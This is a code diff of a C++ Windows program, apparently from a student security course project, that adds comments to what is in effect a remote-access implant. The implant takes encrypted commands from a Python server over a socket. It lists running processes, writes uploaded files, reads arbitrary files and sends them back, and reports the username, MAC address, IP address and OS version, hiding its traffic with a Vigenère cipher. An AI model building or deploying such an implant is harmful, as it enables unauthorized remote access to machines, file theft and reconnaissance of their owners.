@@ -1,4 +1,13 @@
-#define WIN32_LEAN_AND_MEAN
+/*
+* 
+* File: Source.cpp
+* Author: Russell Harvey
+* 
+* Facilitates networking, command execution, and coordinates all other necessary functionality for
+* our CSEC-476 project.
+* 
+*/
+
 #include <iostream>
 #include <WS2tcpip.h>
 #include <string>
@@ -21,19 +30,18 @@
 
 using namespace std;
 
-string CUSTOM = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz4829316705+/";
-
 string get_proc_info(DWORD processID) {
+
+	// Set vars for Proc Name
 	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
 	string procName;
 
-	// Get a handle to the process.
-
+	// Get Proc Handle
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
 		PROCESS_VM_READ,
 		FALSE, processID);
-	// Get the process name.
 
+	// Get Proc Name
 	if (NULL != hProcess)
 	{
 		HMODULE hMod;
@@ -47,6 +55,7 @@ string get_proc_info(DWORD processID) {
 		}
 	}
 
+	// Formatting stuff
 	#ifndef UNICODE
 		procName = szProcessName;
 	#else
@@ -56,16 +65,16 @@ string get_proc_info(DWORD processID) {
 
 	string output = "PID: " + std::to_string(processID) + "| EXE: " + procName + "\n";
 
-	// Release the handle to the process.
-
+	// Close Proc Handle
 	CloseHandle(hProcess);
 
 	return output;
+
 }
 
 string list_procs() {
-	// Get the list of process identifiers.
 
+	// Get PIDs.
 	DWORD aProcesses[1024], cbNeeded, cProcesses;
 	unsigned int i;
 
@@ -74,15 +83,11 @@ string list_procs() {
 		return string("Error: Could not enumerate procs");
 	}
 
-	// Calculate how many process identifiers were returned.
+	// Calculate total PIDs
 	cProcesses = cbNeeded / sizeof(DWORD);
 
-	// Set variable for output
-
+	// Print the name and process identifier for each process, store in output
 	string output = "";
-
-	// Print the name and process identifier for each process.
-
 	for (i = 0; i < cProcesses; i++)
 	{
 		if (aProcesses[i] != 0)
@@ -91,26 +96,39 @@ string list_procs() {
 		}
 	}
 
+	// Return output
 	return output;
+
 }
 
 BOOL upload_file(string file_contents) {
+	// Creates a fstream of the file
 	fstream my_file;
-	my_file.open("uploaded_file.txt", ios::out);
+
+	// Open the fstream, using a default name for simplicity sake
+	my_file.open("uploaded_file", ios::out);
+
+	// Write out file_contents using the fstream
 	if (!my_file) {
 		return FALSE;
 	} else {
 		cout << "File created successfully!";
 		my_file << file_contents;
 		my_file.close();
+		// Return TRUE if successful
 		return TRUE;
 	}
 	return FALSE;
 }
 
 string download_file(string file_name) {
+	// Creates a fstream of the file
 	fstream my_file;
+
+	// Open the fstream, using a default name for simplicity sake
 	my_file.open(file_name, ios::in);
+
+	// Read in contents using the fstream
 	if (!my_file) {
 		return "FNF";
 	}
@@ -121,6 +139,7 @@ string download_file(string file_name) {
 			contents.append(temp + "\n");
 		}
 		my_file.close();
+		// Once read, return the contents
 		return contents;
 	}
 	return "FNF";
@@ -128,10 +147,13 @@ string download_file(string file_name) {
 
 string get_MAC_addr()
 {
+	// Create a PIP_ADAPTER_INFO object 
 	PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP_ADAPTER_INFO));
 	ULONG bufSz = sizeof(IP_ADAPTER_INFO);
+
 	if (info)
 	{
+		// Check for Buffer Overflow
 		if (GetAdaptersInfo(info, &bufSz) == ERROR_BUFFER_OVERFLOW)
 		{
 			info = (PIP_ADAPTER_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info, bufSz);
@@ -139,19 +161,24 @@ string get_MAC_addr()
 
 		if (info)
 		{
+			// Gets adapter info
 			if (GetAdaptersInfo(info, &bufSz) == ERROR_SUCCESS)
 			{
+				// Get ptr to adapter
 				PIP_ADAPTER_INFO ptr = info;
 				while (ptr)
 				{
 					if (ptr->Type == MIB_IF_TYPE_ETHERNET || ptr->Type == IF_TYPE_IEEE80211)
 					{
+						// Create char* for address, use the ptr to insert each byte of the MAC address
 						char* addr = (char*)malloc(18);
 						sprintf(addr, "%02X:%02X:%02X:%02X:%02X:%02X",
 							ptr->Address[0], ptr->Address[1],
 							ptr->Address[2], ptr->Address[3],
 							ptr->Address[4], ptr->Address[5]);
+						// Convert char* addr to C++ string
 						std::string mac = addr;
+						// Return MAC address
 						return mac;
 
 					}
@@ -167,16 +194,19 @@ string get_MAC_addr()
 
 string get_ip_addr()
 {
+	// Create a PIP_ADAPTER_INFO object 
 	PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP_ADAPTER_INFO));
 	ULONG bufSz = sizeof(IP_ADAPTER_INFO);
 	if (info)
 	{
+		// Error check for Buffer Overflow
 		if (GetAdaptersInfo(info, &bufSz) == ERROR_BUFFER_OVERFLOW)
 		{
 			info = (PIP_ADAPTER_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info, bufSz);
 		}
 		if (info)
 		{
+			// Get adapter info
 			if (GetAdaptersInfo(info, &bufSz) == ERROR_SUCCESS)
 			{
 				PIP_ADAPTER_INFO ptr = info;
@@ -184,6 +214,7 @@ string get_ip_addr()
 				{
 					if (ptr->Type == MIB_IF_TYPE_ETHERNET || ptr->Type == IF_TYPE_IEEE80211)
 					{
+						// Get IP address and insert into a string variable
 						string result = ptr->IpAddressList.IpAddress.String;
 
 						HeapFree(GetProcessHeap(), 0, info);
@@ -200,6 +231,7 @@ string get_ip_addr()
 }
 
 string get_user() {
+	// Uses GetUserNameA to retrieve username and returns it as a string
 	char username[257];
 	DWORD size = sizeof(username);
 	GetUserNameA(username, &size);
@@ -208,6 +240,7 @@ string get_user() {
 }
 
 string getOsName() {
+	// Gets base OS that software is running on (should be Windows 32-bit or Windows 64-bit)
 	#ifdef _WIN32
 		return "Windows 32-bit";
 	#elif _WIN64
@@ -226,6 +259,7 @@ string getOsName() {
 }
 
 string get_os() {
+	// Gets major and minor Windows version and build number from GetVersionEX
 	string content;
 	content.append(getOsName());
 	if (content == "Windows 32-bit" || content == "Windows 64-bit") {
@@ -282,14 +316,6 @@ string decode_val(string val, vigCrypt crypt) {
 	return crypt.decrypt(val);
 }
 
-string decode_key(string enc_key) {
-	char* cipher = (char*)malloc(enc_key.size() + 1);
-	memcpy(cipher, enc_key.c_str(), enc_key.size() + 1);
-	const char* pass = cipher;
-	string result = base64_decode(pass, false);
-	return result;
-}
-
 void main()
 {
 
@@ -342,7 +368,7 @@ void main()
 	{
 		enc_key = string(key_buf, 0, keyBytesReceived);
 	}
-	string key = decode_key(enc_key);
+	string key = base64_decode(enc_key);
 	vigCrypt crypt(key);
 
 	// Open loop to listen to requests from Python server...
@@ -357,7 +383,6 @@ void main()
 				string procs = encode_val(list_procs(), crypt);
 				_Post_ _Notnull_ char *proc_list = (char*)malloc(procs.size() + 1);
 				memcpy(proc_list, procs.c_str(), procs.size() + 1);
-				//proc_list = procs.c_str();
 				send(sock, proc_list, strlen(proc_list), 0);
 				free(proc_list);
 			}
@@ -399,8 +424,6 @@ void main()
 					string download_resp = decode_val(string(download_buffer, 0, downloadBytesReceived), crypt);
 					string result = download_file(download_resp);
 					if (result != "FNF") {
-						//string succ = "Success! File has been uploaded";
-						//cout << succ;
 						result = encode_val(result, crypt);
 						_Post_ _Notnull_ char* succ_succ = (char*)malloc(result.size() + 1);
 						memcpy(succ_succ, result.c_str(), result.size() + 1);
@@ -429,7 +452,6 @@ void main()
 				string info = encode_val(sys_info(), crypt);
 				_Post_ _Notnull_ char* info_report = (char*)malloc(info.size() + 1);
 				memcpy(info_report, info.c_str(), info.size() + 1);
-				//proc_list = procs.c_str();
 				send(sock, info_report, strlen(info_report), 0);
 				free(info_report);
 			}
